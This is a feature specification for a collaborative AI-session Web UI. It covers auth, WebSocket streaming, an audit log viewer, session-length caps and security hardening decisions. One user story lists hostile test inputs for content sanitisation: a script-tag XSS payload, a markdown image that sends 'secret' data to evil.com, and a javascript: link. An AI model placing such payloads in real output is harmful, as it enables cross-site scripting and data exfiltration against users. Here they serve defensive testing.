# Feature Specification: Web UI

**Feature Branch**: `011-web-ui`
**Created**: 2026-04-16
**Status**: Implemented (Phase 2 closed 2026-05-04)
**Input**: Constitution S14 Phase 2 scope + sacp-web-ui-spec.md design reference
**Reference**: `sacp-web-ui-spec.md` (detailed design document, not normative — this spec selects what to build)

## Clarifications

### Session 2026-05-11 (spec 022 detection-event-history amendment)

- Q: Where does the entry-point affordance for the detection-event history panel live in the SPA? → A: The facilitator admin panel grows a "View detection history" button (alongside "View audit log" from the spec 029 amendment) that opens the panel at the route `/session/:id/detection_events`. The button is gated by FR-009 role check (facilitator-only) AND by the spec 022 master switch (`SACP_DETECTION_HISTORY_ENABLED=true`).
- Q: How does the panel reconcile live `detection_event_appended` WS events with the active filter set? → A: The same pattern spec 029 uses for `audit_log_appended` (Session 2026-05-08 Q3): the event is applied to the panel within 2s; rows matching the active filter render inline at the top, rows not matching the active filter increment a per-axis hidden-events badge so the operator sees there are more events outside the current filter. Clearing the filter set restores the full loaded page.
- Q: Where does the four-axis filter UI live? → A: Inline in the panel header, above the row list. The order is type → participant → time-range → disposition (matches the URL-query-param order the SPA serializes when sharing a filter view). Time-range ships preset chips (5m / 15m / 1h / all) + a collapsible custom-range datepicker per spec 022 research §9.
- Q: How does the SPA render the trigger snippet column? → A: 200-char truncation with click-to-expand inline. The full snippet ships in the GET endpoint response (and as `trigger_snippet` in the WS payload); the SPA does not refetch on expand. Snippets longer than 200 chars render the first 200 chars + `…` + `[expand]` link. Mirrors spec 029's DiffRenderer click-to-expand pattern for row-detail surfaces.
- Q: Does this amendment promote spec 011's Status away from "Implemented"? → A: No. Spec 011's Phase 2 deliverables remain Implemented. The seven new FRs (FR-035..FR-041) are Phase 3 deliverables tracked under spec 022's task list; they ship when spec 022's tasks land. The `## Implementation Phases` section captures this split. (FR-040 + FR-041 added 2026-05-11 during spec 022 pass 1 closeout — FR-040 pins the re-surface action button affordance + archived-session disabled state; FR-041 pins the SPA refetch contract for the FR-009 best-effort cross-instance failure mode.)

### Session 2026-05-09 (spec 023 user-accounts amendment)

- Q: Where does the entry point for the account flow live in the SPA? → A: The current "paste a token" landing is replaced by an auth gate offering "log in" or "create account" when `SACP_ACCOUNTS_ENABLED=1`. Token-paste remains available behind a "use a token instead" link so the master-switch-off operator deployment retains the existing surface; topology-7 deployments and `SACP_ACCOUNTS_ENABLED=0` deployments fall through to the legacy landing untouched (spec 023 FR-018, research §11).
- Q: How does the SPA render the post-login session list? → A: A two-segment menu sourced from `GET /me/sessions` per spec 023 FR-008 — `active_sessions` rendered first, `archived_sessions` second. Active entries click through to a `POST /me/sessions/{id}/rebind` call that resolves the per-session bearer via the existing SessionStore flow (spec 011 H-02 invariants preserved); archived entries open the read-only transcript view per spec 001 archived-session semantics. Empty arrays render as a "no sessions yet" empty state, NOT a 404 (spec 023 FR-008 acceptance scenario 4).
- Q: How does the email-change flow surface in the UI? → A: Two notifications, one verification UI. The OLD email receives an informational heads-up that requires no recipient action (spec 023 clarify Q11); the NEW email receives a verification code that the user enters via a dedicated email-change verification UI gated to the authenticated session. The `accounts.email` field does NOT update until the code is submitted (spec 023 FR-010).
- Q: How does the password-change flow handle other open sessions for the same account? → A: On a successful password change, the orchestrator invalidates every `SessionStore` sid associated with the account_id EXCEPT the actor's current authenticated sid (spec 023 FR-011 / clarify Q12). The SPA shows a "session refreshed — other devices logged out" toast on success; OTHER tabs / devices observe HTTP 401 on their next request and present the login flow per FR-014 close-code handling.
- Q: Does account deletion need a disambiguation modal like length-cap-decrease? → A: No. Deletion is a typed-confirmation modal — no choice between absolute / relative options exists; the action is a single explicit commit. On submit, the SPA shows a post-deletion landing summarising the export emit (debug-export to the registered email per spec 023 FR-012) and the email grace window (`SACP_ACCOUNT_DELETION_EMAIL_GRACE_DAYS`).
- Q: Are any new WebSocket events introduced by spec 023? → A: No. Spec 023 password-change invalidation surfaces as a 401 on the next SessionStore-gated request, which the SPA already handles via FR-014's existing 401 handler. The `audit_log_appended` event from spec 029 already covers account-related audit events (account_create, account_login, account_email_change_consumed, etc.) when the audit panel is open and the account-action audit rows are visible to the facilitator.
- Q: Does this amendment promote spec 011's Status away from "Implemented"? → A: No. Spec 011's Phase 2 deliverables remain Implemented. The five new FRs (FR-030..FR-034) are Phase 3 deliverables tracked under spec 023's task list; they ship when spec 023 implements its account endpoints, the SessionStore extension, and the per-IP rate limiter. The `## Implementation Phases` section captures this split via the new "Phase 3c — Account UI (ships with spec 023)" subsection.

### Session 2026-05-08 (spec 029 audit-log-viewer amendment)

- Q: Where does the entry-point affordance for the audit log viewer live in the SPA? → A: The facilitator admin panel grows a "View audit log" button (alongside pending approvals, invite generation, etc.) that opens the panel as a route at `/session/:id/audit`. Spec 011 FR-016's audit-log sub-bullet evolves from a debug-export-rendered listing into the dedicated audit panel from spec 029. The route is gated by FR-009 role check (facilitator-only) and by the spec 029 master switch (`SACP_AUDIT_VIEWER_ENABLED=true`).
- Q: Does the audit panel render in-place (modal) or as a route? → A: Route at `/session/:id/audit` (path settled in spec 029 plan). A modal would crowd the existing facilitator admin panel and prevent direct linking; a route lets operators bookmark and share the audit URL within the operator team and survives a panel-close without losing filter state.
- Q: How does the SPA handle the `audit_log_appended` WS event when the audit panel is NOT open? → A: The event is consumed silently — no toast, no badge on the admin-panel button. When the panel opens, it fetches the current state via the spec 029 endpoint, so missed pushes never produce data loss (the audit log is the durable source of truth). Adding an unread-count badge is a Phase 3+ enhancement gated on operator demand.
- Q: How does row expansion route to the DiffRenderer? → A: A row-level expand affordance is shown ONLY for action types whose audit row contains non-null `previous_value` / `new_value` columns (e.g., `review_gate_edit`, `session_config_change`); rows whose action is value-less (e.g., `add_participant`) expand to plain row metadata without invoking the renderer. The DiffRenderer module (spec 029 FR-008) handles the `(previousValue, newValue, format)` props with `format='auto'` as the default; size thresholds are inherited from the spec 029 module's locked constants.
- Q: Does this amendment promote spec 011's Status away from "Implemented"? → A: No. Spec 011's Phase 2 deliverables remain Implemented. The five new FRs (FR-025..FR-029) are Phase 3 deliverables tracked under spec 029's task list; they ship when spec 029 implements its viewer endpoint, WS event emitter, action-label registry, and DiffRenderer module. The `## Implementation Phases` section captures this split.
### Session 2026-05-07 (spec 025 length-cap amendment)

- Q: Where does the cap-config control set live in the SPA? → A: Two surfaces share the same component — the session-create modal (US11 token-reveal flow) and the facilitator session-settings panel (US6 admin panel). The control offers four presets (Short / Medium / Long / Custom) and, when Custom is selected, hand-set inputs for `length_cap_seconds` and `length_cap_turns` per spec 025 FR-023.
- Q: How does the SPA render the conclude-phase banner? → A: A dismissible-styled banner pinned to the top of the participant view, driven by the `session_concluding` WS event payload from spec 025 FR-017. The banner reads "Session is concluding — N turns left" or "Session is concluding — N minutes left" depending on the trigger dimension; both fields when both caps are set. The banner clears on `session_concluded` (FR-018) or on a `loop_state_changed` event flipping back to `running` (cap-extension exit per spec 025 FR-013, US3).
- Q: What does the SPA show when the cap-set endpoint returns 409? → A: A modal presenting the two interpretation options (absolute / relative) with the consequence text from the 409 response body. The facilitator picks one; the SPA re-POSTs with `interpretation` set explicitly per spec 025 FR-026.
- Q: Are cap values shown to non-facilitator participants? → A: No. Spec 025 FR-019 mandates facilitator-only cap visibility. The cap-config controls (FR-021, FR-022 below) are gated by FR-009 role check; the conclude banner shows `remaining` countdown (which is allowed) but never the cap value itself.
- Q: Does this amendment promote the spec's Status away from "Implemented"? → A: No. Spec 011's Phase 2 deliverables remain Implemented. The four new FRs (FR-021..FR-024) are Phase 3 deliverables tracked under spec 025's task list; they ship when spec 025 implements its WS event emitters and cap-set endpoint. The `## Implementation Phases` section captures this split.

### Session 2026-05-12 (co-drafted with spec 027 implementation)

- Q: How does the SPA render the `wait_mode` value for AI participants? → A: A facilitator-only badge on the participant card derived in `frontend/standby_ui.js:formatWaitModeBadge`. The value rides on the `participant_update` payload extension introduced by spec 027 FR-058; no polling fetch.
- Q: How does the SPA render the standby state? → A: A pill on the participant card driven by `participant_standby` + `participant_standby_exited` WS events with copy from `frontend/standby_ui.js:formatStandbyPill`. The pill is distinct from the existing paused-manual / paused-breaker indicators (FR-020) and from the long-term-observer badge (FR-056).
- Q: Where do facilitators change a participant's wait_mode? → A: In the participant-card admin overlay, posting to `POST /tools/participant/set_wait_mode` per spec 027 FR-025 + `contracts/wait-mode-endpoint.md`. Gated by FR-009 role check; non-facilitators never see the toggle.
- Q: How do pivot messages render? → A: A banner-style affordance for any message row whose `metadata.kind === 'orchestrator_pivot'`. The discriminator is read from `frontend/standby_ui.js:isPivotMessage`; no separate API call.
- Q: Does this amendment promote the spec's Status away from "Implemented"? → A: No. Spec 011's Phase 2 deliverables remain Implemented. The eight new FRs (FR-052..FR-059) are Phase 3 deliverables tracked under spec 027's tasks.md; they ship when spec 027 implements its endpoint + WS events + frontend module. The `## Implementation Phases` section captures this split under the new "Phase 3d — Standby UI" subsection.

### Session 2026-05-02 (audit fix/011-operations — Phase E)

- Q: What's the deploy semantics for Web UI session affinity? → A: Phase 1 single-instance topology — all WS connections terminate at the same orchestrator process. Multi-instance (Phase 3) requires WS session affinity (sticky sessions on the load balancer) OR session-state externalization (Phase 3 SessionStore Redis backend). Today, on redeploy, all WS connections close; clients reconnect within FR-014 backoff window.

- Q: What's the operational risk if `cdn.jsdelivr.net` or `unpkg.com` is unavailable? → A: The UI fails to load — React, ReactDOM, marked, DOMPurify, Babel are all CDN-fetched. No fallback bundle ships in Phase 1. SR-001 SRI integrity attributes prevent tampered responses but do not provide availability. Phase 3 mitigation: server-side bundling. Until then: accepted residual; CDN uptime is a deployment dependency.

- Q: How does browser cache invalidate across deploys? → A: SR-008 `Cache-Control: no-store` on `/` and `/api/*` ensures the SPA HTML + dynamic responses fetch fresh on each load. CDN-fetched scripts (jsdelivr, unpkg) are versioned in URL (`react@18.2.0` etc.); cache invalidation is the URL change. If the deploy bumps the React version, browsers fetch the new URL.

- Q: What reverse-proxy configurations are supported? → A: Phase 1 documented configurations are Caddy, nginx, Cloudflare. Required: WS upgrade headers (`Upgrade`, `Connection`), `X-Forwarded-For` set, `X-Forwarded-Proto: https`. CSP reporting (`/csp-report` POSTs) must be allowed through. Operator's reverse-proxy MUST NOT strip the `X-SACP-Request: 1` CSRF header on mutations. See runbook §13.2.

- Q: Does the Web UI support multi-tenant deployments (multiple operator orgs on one instance)? → A: No. Phase 1 is explicit single-tenant — one `SACP_*` env-var set, one DB, one origin. Multi-tenant is Phase 3+ scope (out of scope per Constitution §3 topologies 1-7 single-deployment).

- Q: What's the CSP-report log volume risk? → A: A misconfigured CSP can flood logs (e.g., a CDN URL not in connect-src triggers a report on every page load). Phase 1 has no rate-limit on `/csp-report`; the endpoint logs at WARNING and returns 204. Operator mitigation: monitor CSP-report ingest rate; if sustained > 10/sec for the same blocked-URL, fix the CSP rather than let logs grow. Phase 3 trigger: any deployment observing log-volume DoS via CSP reports; implementation: per-origin rate-limit on `/csp-report`.

### Session 2026-05-02 (audit fix/011-compliance — Phase D)

- Q: Does the Web UI's auth cookie require a consent banner? → A: No. The single `sacp_session` HttpOnly cookie qualifies for ePrivacy Art. 5(3) "strictly necessary" exemption (required to deliver the authenticated service the user requested). No marketing, analytics, or fingerprinting cookies in Phase 1. Adding any non-strictly-necessary cookie in Phase 3 requires the operator to add a compliant consent UI.

- Q: Does the join flow surface Art. 13 information-to-be-provided? → A: No. SACP surfaces participant role + session visibility on connect (FR-003 + state_snapshot) but does not present operator identity / processing purposes / subject-rights routing. That UI is the operator's responsibility and lives in their onboarding wrapper. Phase 3 trigger: any deployment where the Web UI is the primary participant-facing surface (no operator wrapper).

- Q: Does loading React / Babel / DOMPurify from CDN constitute Art. 44 cross-border transfer? → A: For EU data subjects, yes. The browser request to `cdn.jsdelivr.net` and `unpkg.com` leaks client IP + page URL to Cloudflare-fronted CDNs. SR-002's `Referrer-Policy: no-referrer` minimizes the referrer leak; client IP is unavoidable. Phase 3 mitigation: server-side bundling (eliminates the CDN); trigger: any EU deployment where the CDN transfer is unacceptable.

- Q: How does CSP report-uri (`/csp-report`) handle PII? → A: Violation reports may contain blocked-URL fragments including PII (if exfiltration was attempted). The endpoint logs at WARNING through 007 §FR-012 ScrubFilter; retention is operator-controlled application-log retention. Phase 3 trigger: any deployment with regulatory log-retention requirements demanding a separate purge schedule.

### Session 2026-05-01 (audit fix/011-testability — Phase B)

- **JS test framework decision**: Playwright (via `pytest-playwright`, already in `[e2e]` extras) is the adopted framework for browser-requiring tests. The frontend is a CDN-loaded React SPA with no build system (`type="text/babel"`, script tags, no package.json), so Jest and Vitest have no module entry point to target. Playwright drives a real browser against the running server, covering the shipping artifact as-is. Server-testable items (SR-010, SR-011, per-directive CSP) land in `tests/test_011_testability.py` (Phase B). Browser-only items (SR-001a frame cap, SR-009 forbidden link schemes, SR-012 malformed-frame full flow, FR-014 auto-reconnect backoff, US-by-US e2e, CDN-failure graceful-degradation) are deferred to Phase F with Playwright. FR-to-test traceability for all 011 FR/SR markers added to `docs/traceability/fr-to-test.md`.

- **Per-IP WS cap (audit H-03)**: The 4429 `CLOSE_TOO_MANY` close code documented in `contracts/websocket-events.md` is now enforced server-side via `SACP_WS_MAX_CONNECTIONS_PER_IP` (default 10). The `WebSocketManager` reserves a slot atomically before `accept()` so a hostile peer cannot win a half-handshake race; the slot is released on `unregister`. Pre-fix the constant was defined but never wired, so a single host could open unbounded WS upgrades and exhaust the manager.

- **Opaque session cookie + server-side bearer store (audit H-02 / M-08)**: The session cookie now carries an opaque sid only; the bearer + `(participant_id, session_id)` binding lives in a process-local `SessionStore` keyed by that sid. Pre-fix the cookie payload was a base64-readable JSON blob containing the bearer, so cookie-jar exfiltration (compromised endpoint, malicious browser extension, downgraded-link intercept) recovered the token directly. `/login` mints an sid via `SessionStore.create`; `/logout` deletes it; `/me` and the WebSocket upgrade resolve sid → entry → revalidate the stored bearer. Cookies that survive logout cannot be replayed because the sid no longer maps to anything. The bearer is still returned to JS via `/me` for cross-origin MCP calls — eliminating that requires a same-origin proxy refactor and is tracked separately.

- **Independent cookie-signing key (audit M-02)**: Cookie signing now reads `SACP_WEB_UI_COOKIE_KEY` instead of `SACP_ENCRYPTION_KEY`. The two secrets have different threat models — one protects at-rest API-key encryption, the other guards session-cookie integrity — and reusing one for both meant a leak of either compromised both. The new var is required at startup with the same `>= 32 chars + no placeholder` shape as `SACP_AUTH_LOOKUP_KEY`. Cookie salt bumped to `sacp-ui-cookie-v2` so any pre-fix cookies are explicitly rejected on first read.

- **Same-origin MCP proxy + bearer fully off the SPA (audit H-02 closure)**: The Web UI now exposes `/api/mcp/<path>` as a same-origin proxy that resolves the cookie sid → server-side `SessionEntry` → attaches `Authorization: Bearer …` to the upstream request before forwarding to `SACP_WEB_UI_MCP_ORIGIN`. Both `/me` and `/login` responses no longer return the bearer to JS, and the SPA's `mcpCall` helper switches from cross-origin Bearer auth to same-origin cookie auth. The "Show my token" SPA affordance is removed — users save the bearer at issuance via the create / add-participant token-reveal modals. Defense-in-depth: the proxy strips client-supplied `Authorization` (so a compromised SPA cannot use the proxy as a bearer-validation oracle) and any upstream `Set-Cookie` (so a misconfigured MCP build cannot clobber the Web UI session cookie). A small bootstrap allowlist (`tools/session/create`, `tools/session/request_join`, `tools/session/redeem_invite`) forwards without an Authorization header — the upstream routes are public by design and the SPA needs them before any cookie exists. The proxy also sets `X-Forwarded-For` and `X-Forwarded-Proto` so MCP's IP-binding check (which is otherwise blind to a proxy hop) sees the original client IP — the MCP middleware honors XFF from a loopback caller in addition to the existing `SACP_TRUST_PROXY=1` path, since the in-container proxy hop is the only legitimate loopback ingress and on-host attackers already sidestep IP binding by virtue of being on-host. Inbound forwarded-* headers are stripped by default and only chained through when `SACP_TRUST_PROXY=1` signals the Web UI itself sits behind a trusted upstream. **Web UI client-IP extraction is unified across `/login`, `/me` revalidation, and the `/ws` upgrade**: all three surfaces honor `SACP_TRUST_PROXY=1` consistently (rightmost XFF when set, direct peer otherwise) so a deployment behind a fronting reverse proxy binds the user's actual IP at login and matches it on every subsequent surface. Pre-fix only the MCP middleware honored TRUST_PROXY; `/login` and `/ws` read `request.client.host` directly, so a fronted deployment would bind the proxy IP at login and 403 every MCP-via-proxy call (which correctly reads XFF). Loopback is NOT auto-trusted on these user-facing surfaces — that concession lives only in the MCP middleware where the loopback caller is provably the in-container proxy hop.

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Facilitator Creates and Monitors a Session (Priority: P1)

A facilitator opens the Web UI at port 8751, enters their bearer token, and lands on a session view showing the live transcript, participant list, and session controls. They can inject messages, pause/resume the loop, add participants, and watch AI turns stream in real-time via WebSocket.

**Why this priority**: This is the primary use case — replacing Swagger UI as the operational interface.

**Acceptance Scenarios**:

1. **Given** a valid facilitator token, **When** they log in, **Then** the session view loads with transcript, participant sidebar, and controls.
2. **Given** a running session, **When** a new AI turn completes, **Then** the message appears in the transcript within 2 seconds via WebSocket.
3. **Given** the facilitator view, **When** they type a message and press Ctrl+Enter, **Then** the message is injected into the session.
4. **Given** a running loop, **When** the facilitator clicks Pause, **Then** the loop stops and the status badge updates to "paused".

---

### User Story 2 - Participant Observes and Interjects (Priority: P1)

A participant enters their token and sees the transcript and their own controls (routing mode, prompt tier). They can inject messages but cannot access facilitator-only controls (add/remove participants, session config, audit log).

**Why this priority**: Participants need a usable interface beyond Swagger to follow and contribute to conversations.

**Acceptance Scenarios**:

1. **Given** a participant token, **When** they log in, **Then** facilitator-only controls are hidden.
2. **Given** a participant view, **When** they inject a message, **Then** it appears in the transcript at the correct position.
3. **Given** a participant, **When** they change their routing preference, **Then** the change takes effect on the next turn.

---

### User Story 3 - Real-Time WebSocket Streaming (Priority: P1)

The UI maintains a WebSocket connection to the server for push-based updates. New messages, participant status changes, convergence updates, and session events arrive without polling. The connection auto-reconnects on drop with exponential backoff.

**Why this priority**: Polling the REST API would miss real-time events and waste bandwidth. WebSocket is the backbone of the live experience.

**Acceptance Scenarios**:

1. **Given** a connected WebSocket, **When** a turn completes, **Then** a `message` event arrives with full message content.
2. **Given** a dropped connection, **When** the client reconnects, **Then** it receives a full `state_snapshot` to resync.
3. **Given** an expired token, **When** the WebSocket closes with code 4401, **Then** the client stops reconnecting and shows a re-login prompt.

---

### User Story 4 - Budget and Convergence Dashboard (Priority: P2)

The right sidebar displays per-participant budget utilization (spend vs. limit) and a convergence sparkline showing similarity over the last 50 turns. The facilitator sees exact costs; participants see their own costs and utilization percentages for others.

**Why this priority**: Situational awareness for cost management and conversation quality. Without this, facilitators must repeatedly call debug/export to check costs and convergence.

**Acceptance Scenarios**:

1. **Given** a participant with `budget_daily` set, **When** turns accrue cost, **Then** the budget bar shows utilization percentage and changes color as it approaches 100%.
2. **Given** 10+ turns, **When** convergence is computed, **Then** the sparkline graph renders similarity scores with a threshold line.
3. **Given** a non-facilitator participant, **When** viewing another participant's budget card, **Then** only the utilization percentage is shown, not exact dollar amounts.

---

### User Story 5 - Review Gate Draft Approval (Priority: P2)

When a participant's AI is in `review_gate` mode, drafts appear in the right sidebar with Approve/Edit/Reject buttons. The facilitator can review the draft content, see security flags from the output validation pipeline, and resolve the draft before the timeout expires.

**Why this priority**: Review gate is a key human-in-the-loop safety mechanism. Without a UI, approval requires raw API calls.

**Acceptance Scenarios**:

1. **Given** a participant in review_gate mode, **When** their AI generates a response, **Then** the draft appears in the ReviewGateQueue with content and action buttons.
2. **Given** a pending draft, **When** the facilitator clicks Approve, **Then** the response enters the transcript.
3. **Given** a pending draft, **When** the timeout expires, **Then** the draft is auto-rejected and the turn is skipped.

---

### User Story 6 - Facilitator Admin Panel (Priority: P2)

The facilitator has a collapsible admin panel in the left sidebar with: pending participant approvals, session config editing, invite link generation, and an audit log of facilitator actions.

**Why this priority**: Session management currently requires multiple Swagger endpoints. Consolidating into a panel improves facilitator workflow.

**Acceptance Scenarios**:

1. **Given** a pending participant, **When** the facilitator clicks Approve, **Then** the participant becomes active and appears in the participant list.
2. **Given** the session config panel, **When** the facilitator changes `convergence_threshold`, **Then** the change is applied and logged in the audit trail.
3. **Given** the invite generator, **When** the facilitator clicks Generate, **Then** a copyable invite link is shown.

---

### User Story 7 - Proposal and Decision Tracking (Priority: P3)

Participants can create proposals (decisions to be voted on). Active proposals appear in the right sidebar with vote tallies. Participants vote Accept/Reject/Abstain. Resolved proposals collapse to a summary line.

**Why this priority**: Decision tracking is a Phase 2 constitution requirement but can ship after core UI is stable.

**Acceptance Scenarios**:

1. **Given** an active proposal, **When** a participant votes, **Then** the tally updates in real-time for all connected users.
2. **Given** all participants have voted, **When** the proposal resolves, **Then** it moves to the resolved section with final status.

---

### User Story 9 - Summary Viewer (Priority: P2)

The facilitator (or any participant) can open a "Summary" panel that displays the latest structured summarization checkpoint for the session: decisions, open questions, key positions per participant, and a narrative overview. The view refreshes when a new checkpoint is generated.

**Why this priority**: Phase 1 generates structured summaries every N turns (`GET /tools/session/summary`), but without a UI the facilitator has to read raw JSON to review them. This is the primary artifact for long-running sessions.

**Acceptance Scenarios**:

1. **Given** a session with at least one summarization checkpoint, **When** the user opens the Summary panel, **Then** decisions, open questions, key positions, and narrative render as readable sections.
2. **Given** the Summary panel is open, **When** a new checkpoint is generated, **Then** the panel refreshes to the newest summary.
3. **Given** a session with no summary yet, **When** the user opens the panel, **Then** a placeholder indicates "no checkpoint yet" with the turn threshold info.

---

### User Story 11 - Guest Landing (Priority: P1)

A first-time visitor lands on the Web UI without a token and sees three paths: **Sign in** (paste an existing token), **Create a new session** (become a facilitator), or **Request to join a session** (by session ID). The token-first AuthGate is replaced so non-facilitator humans can self-onboard without the facilitator needing to manually distribute tokens.

**Why this priority**: The prior flow required every human to obtain a bearer token out-of-band before they could even see the dashboard, which broke normal onboarding. Guest landing removes that friction and makes the UI usable as a first touchpoint.

**Acceptance Scenarios**:

1. **Given** a guest with no cookie, **When** they open the UI, **Then** the landing page offers Sign in / Create / Request to join.
2. **Given** the Create form, **When** the guest enters their name and submits, **Then** a session is created with a git-branch-style slug, the facilitator display name is prefixed `Facilitator-<name>`, and a token-reveal modal displays the bearer token with a copy button.
3. **Given** the facilitator acknowledges the token-reveal, **When** they click "enter the session", **Then** they land in the standard SessionView with their new session ready.
4. **Given** the facilitator's SessionView, **When** they click the session name in the header, **Then** an inline input lets them rename it and the new name broadcasts to every subscriber.

---

### User Story 12 - Request to Join by Session ID (Priority: P1)

A guest who wasn't given a token can enter an existing session ID plus their display name to submit a join request. The server creates a `role='pending'` participant and returns an auth token; the guest logs in and sees a minimal holding screen (session name + list of human participants) while the facilitator approves or rejects them. On approval, they transition seamlessly into the normal SessionView.

**Why this priority**: Pairs with US11 to complete the self-onboarding flow — without it, facilitators still have to generate invites or tokens manually for every new participant. Also unblocks pending-participant testing of US6 AC1 which was previously unexercisable.

**Acceptance Scenarios**:

1. **Given** a guest with a known session ID, **When** they submit `{session_id, display_name}` via Request-to-join, **Then** the server creates a pending participant and returns an auth token.
2. **Given** a pending participant logged in, **When** they connect the WebSocket, **Then** the state_snapshot is filtered to session name + human participants only (no transcript, no AI roster).
3. **Given** the facilitator's admin panel shows N pending participants, **When** they click Approve on one, **Then** that participant's client receives a `participant_update` event flipping their role to `participant` and the UI escalates from the holding screen to SessionView.
4. **Given** the facilitator's loop controls, **When** they click Start with no human message posted yet, **Then** the call returns `409` with an explanatory message — the loop refuses to dispatch so the first turn can't be an AI hallucinating a welcome message.

---

### User Story 10 - Participant Health Indicators (Priority: P2)

Each participant card in the left sidebar surfaces health state: `active`, `paused` (manually or by circuit breaker), `offline`, `pending approval`. When a participant is auto-paused by the circuit breaker (`consecutive_timeouts ≥ 3`), the card shows a distinct "breaker tripped" badge with the failure count, distinguishing it from manual pauses. The facilitator can see recent failure reasons (from `routing_log` skip entries).

**Why this priority**: Phase 1 auto-pauses participants on repeated provider failures, but without a health indicator facilitators can't tell *why* an AI went quiet — was it removed, paused manually, or tripped by auth errors? This is critical for diagnosing session issues.

**Acceptance Scenarios**:

1. **Given** a participant with `consecutive_timeouts=3` and `status=paused`, **When** viewing their card, **Then** a "breaker tripped" badge is visible with the timeout count.
2. **Given** a manually paused participant, **When** viewing their card, **Then** the badge reads "paused" without the breaker indicator.
3. **Given** a facilitator view, **When** a participant has recent skip entries, **Then** hovering the health badge shows the last 3 skip reasons.

---

### User Story 8 - Secure Content Rendering (Priority: P1)

AI-generated message content is rendered as markdown with mandatory security controls: raw HTML stripped, images neutralized, links sanitized, invisible Unicode characters revealed. Review gate drafts display output validation risk scores and security flags.

**Why this priority**: The transcript renders untrusted AI output. Without security controls, the UI is vulnerable to XSS, data exfiltration via markdown images, and context poisoning via invisible characters.

**Acceptance Scenarios**:

1. **Given** a message containing `<script>alert(1)</script>`, **When** rendered, **Then** the script tag is stripped entirely.
2. **Given** a message containing `![img](https://evil.com/x?data=secret)`, **When** rendered, **Then** the image is replaced with `[Image: img]` text.
3. **Given** a message containing zero-width spaces, **When** rendered, **Then** visible `[ZWS]` markers appear and a warning badge shows the count.
4. **Given** a link with `javascript:` scheme, **When** rendered, **Then** the link is blocked and replaced with a warning span.

---

### User Story 14 - Audit Log Viewer Surface (Priority: P2)

The facilitator opens the audit log viewer from the admin panel and reviews every facilitator action, review-gate edit, participant lifecycle event, and session-config change for the current session in reverse-chronological order. Action labels render as human-readable English (e.g., "Facilitator removed Haiku" rather than `remove_participant`). Rows whose action carries `previous_value` / `new_value` columns expand into a side-by-side diff. Filter controls narrow the displayed set by actor, action type, and time range. New audit events arrive via WebSocket push within 2s. Non-facilitator participants cannot reach the route; the master switch `SACP_AUDIT_VIEWER_ENABLED` hides the entry-point affordance and returns 404 from the route when disabled.

**Why this priority**: Spec 029 ships the backend endpoint, the action-label registry, the DiffRenderer module, and the WS event emitter. Without the UI surfaces here — the entry-point affordance, the panel route, the filter controls, the row-expansion-to-diff wiring, the scrub-display fallback — the audit data stays locked behind spec 010 debug-export's JSON. P2 because operators can still parse debug-export JSON for diagnostic review; the v1 viewer surface is the operator-workflow upgrade rather than a strict prerequisite.

**Acceptance Scenarios**:

1. **Given** a session with audit events, **When** the facilitator clicks "View audit log" from the admin panel, **Then** the SPA navigates to `/session/:id/audit` AND the panel renders rows in reverse-chronological order with human-readable action labels from the registry.
2. **Given** an audit row whose action is `review_gate_edit` with text values, **When** the facilitator clicks expand, **Then** the DiffRenderer renders a line-by-line side-by-side diff (original on left, edited on right) per spec 029 FR-008.
3. **Given** an audit row whose action is value-less (e.g., `add_participant`), **When** the row is expanded, **Then** plain row metadata renders without invoking the DiffRenderer (no empty diff pane).
4. **Given** the facilitator selects a single action-type filter, **When** the filter applies, **Then** only rows of that action display AND the filter-control badge displays the count of WS-pushed events that did not match (per spec 029 FR-013).
5. **Given** a new audit event is written for the active session, **When** the WS broadcast fires, **Then** the panel adds the new row within 2s without a manual refresh (per spec 029 FR-010).
6. **Given** an audit row whose registry entry has `scrub_value=true`, **When** the row renders, **Then** value fields display `[scrubbed]` (per spec 029 FR-014); the full content remains available only via spec 010 debug-export.
7. **Given** a non-facilitator participant attempts to navigate to `/session/:id/audit`, **When** the request fires, **Then** the SPA shows a "facilitator-only" notice AND the API returns HTTP 403 (per spec 029 FR-002).
8. **Given** `SACP_AUDIT_VIEWER_ENABLED=false`, **When** the SPA renders the admin panel, **Then** the "View audit log" button is hidden AND any direct navigation to `/session/:id/audit` returns HTTP 404 (per spec 029 FR-018).
### User Story 13 - Session-Length Cap Configuration and Conclude-Phase Banner (Priority: P2)

The facilitator can set a session-length cap (time and/or turns) at session-create or mid-session via session-settings, and watch the loop transition into a conclude phase with a Tier 4 wrap-up delta and a final summarizer before auto-pause. All participants see a banner during conclude phase indicating how much wrap-up budget remains; only the facilitator sees the cap values themselves. When a cap update would land below current elapsed, the SPA presents an absolute-vs-relative disambiguation modal so the facilitator's intent is captured explicitly rather than guessed.

**Why this priority**: Spec 025 ships the backend mechanism; without the UI surfaces here, the cap is set-and-pray (no banner pacing, no disambiguation choice, no graceful session-create flow). P2 because the backend can ship behind env-var defaults without the UI for early operator testing, but the facilitator workflow is degraded without these four pieces.

**Acceptance Scenarios**:

1. **Given** the session-create modal (US11 flow), **When** the facilitator picks the Short preset, **Then** the new session is created with `length_cap_kind='both'`, `length_cap_seconds=1800`, `length_cap_turns=20` and the loop starts.
2. **Given** the facilitator session-settings panel (US6 admin panel), **When** the facilitator updates the cap mid-session, **Then** the cap-set endpoint commits the change (200) AND `routing_log` records `reason='cap_set'`.
3. **Given** an active session reaches 80% of its turn cap, **When** the orchestrator broadcasts `session_concluding`, **Then** every connected participant sees the conclude banner with the `remaining` countdown.
4. **Given** the loop transitions to paused after the final summarizer, **When** the orchestrator broadcasts `session_concluded`, **Then** the banner clears AND a "Session concluded" notice renders with the `pause_reason` translated to user-facing copy.
5. **Given** a cap update that would land below current elapsed, **When** the cap-set endpoint returns 409 with both interpretation options, **Then** the SPA renders a modal with `absolute` and `relative` choices including the consequence description; **When** the facilitator picks one, **Then** the SPA re-POSTs with the explicit `interpretation` field and the cap commits (200).
6. **Given** a non-facilitator participant connected to a capped session, **When** they inspect their `/me` response and the conclude banner payload, **Then** neither contains `length_cap_seconds` nor `length_cap_turns` (FR-019 visibility constraint enforced).

---

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: Web UI served by FastAPI on port 8751, separate from the MCP API on 8750.
- **FR-002**: Single-file React JSX (CDN-loaded, no build toolchain). Split to modules if exceeding ~2000 lines.
- **FR-003**: Bearer token authentication via login screen. Token held in HttpOnly cookie or React ref — never in localStorage/sessionStorage. After `POST /tools/participant/rotate_token`, the UI MUST treat the existing cookie + ref as invalid (redirect to AuthGate; WebSocket will close 4401 on next upgrade).
